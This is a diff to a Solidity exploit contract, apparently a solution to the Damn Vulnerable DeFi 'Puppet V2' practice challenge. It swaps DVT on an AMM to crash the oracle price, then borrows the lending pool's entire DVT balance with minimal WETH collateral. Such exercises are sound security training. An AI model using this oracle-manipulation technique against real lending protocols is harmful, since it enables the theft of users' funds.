@@ -35,62 +35,34 @@ contract AttackV2Puppet{
         weth.transferFrom(msg.sender, address(this), weth.balanceOf(msg.sender));
 
         //We do this until we have no more tokens in the pool
-        while (dvt.balanceOf(address(pool)) > 0)
-        {
-            console.log("------------------------------------------------------");
-            console.log("Starting Phase1:");
-            console.log("DVTBalanceOfPool  = %s", dvt.balanceOf(address(pool)));
-            console.log("WETHBalanceOfPool = %s", weth.balanceOf(address(pool)));
-            console.log("DVTBalanceOfUs    = %s", dvt.balanceOf(address(this)));
-            console.log("WETHBalanceOfUs   = %s", weth.balanceOf(address(this)));
-                        
-            //PHASE 1: Swapping at the AMM
-            //approve the router to spend our tokens
-            dvt.approve(address(router), dvt.balanceOf(address(this)));
 
-            //generate the path
-            address[] memory path = new address[](2);
-            path[0] = address(dvt);
-            path[1] = address(weth);
-
-            //swap our tokens for eth
-            router.swapExactTokensForTokens(dvt.balanceOf(address(this)), 1, path, address(this), block.timestamp + 42069);
-
-            console.log("------------------------------------------------------");
-            console.log("Starting Phase2:");
-            console.log("DVTBalanceOfPool  = %s", dvt.balanceOf(address(pool)));
-            console.log("WETHBalanceOfPool = %s", weth.balanceOf(address(pool)));
-            console.log("DVTBalanceOfUs    = %s", dvt.balanceOf(address(this)));
-            console.log("WETHBalanceOfUs   = %s", weth.balanceOf(address(this)));
-
-            //PHASE 2: Lending out as much as we can
-            //calculate how many tokens we can lend out
-            uint256 max_lend = maxLend(weth.balanceOf(address(this)));
-
-            //We are still not able to get all
-            if (max_lend < dvt.balanceOf(address(pool)))
-            {
-                console.log("Normal Lending");
-                //Lend out as many tokens as possible
-                weth.approve(address(pool), weth.balanceOf(address(this)));
-                pool.borrow(max_lend);
-            }
-            else
-            {
-                //we need to exactly calculate how to get the rest out
-                console.log("Final Lending");
-
-                //calculate how much weth we need to send to get the rest of the tokens out
-                uint256 final_value_sent = neededCollateral(dvt.balanceOf(address(pool)));
-
-                //approve so it can use transferFrom()
-                weth.approve(address(pool), final_value_sent);
-                pool.borrow(dvt.balanceOf(address(pool)));
-            }
-        }
+        //PHASE 1: Swapping at the AMM
+        //approve the router to spend our tokens
+        dvt.approve(address(router), dvt.balanceOf(address(this)));
 
         //generate the path
         address[] memory path = new address[](2);
+        path[0] = address(dvt);
+        path[1] = address(weth);
+
+        //swap our tokens for eth
+        router.swapExactTokensForTokens(dvt.balanceOf(address(this)), 1, path, address(this), block.timestamp + 42069);
+
+        //PHASE 2: Lending out as much as we can
+        //calculate how many tokens we can lend out
+        uint256 max_lend = maxLend(weth.balanceOf(address(this)));
+
+        //we need to exactly calculate how to get the rest out
+        console.log("Final Lending");
+
+        //calculate how much weth we need to send to get the rest of the tokens out
+        uint256 final_value_sent = neededCollateral(dvt.balanceOf(address(pool)));
+
+        //approve so it can use transferFrom()
+        weth.approve(address(pool), final_value_sent);
+        pool.borrow(dvt.balanceOf(address(pool)));
+        
+        //generate the new path
         path[0] = address(weth);
         path[1] = address(dvt);
 
